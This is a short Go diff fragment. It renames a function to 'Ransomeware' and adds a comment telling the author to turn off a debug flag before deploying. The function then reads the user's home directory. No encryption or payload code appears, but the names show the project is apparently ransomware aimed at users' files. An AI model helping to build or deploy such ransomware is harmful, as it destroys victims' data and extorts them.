@@ -11,8 +11,8 @@ import (
 	"path/filepath"
 )
 
-func GetAllFiles() {
-	DEBUG := true
+func Ransomeware() {
+	DEBUG := true //change it to false while deploying
 	homeDir, err := os.UserHomeDir()
 	if err != nil {
 		log.Fatal(err)
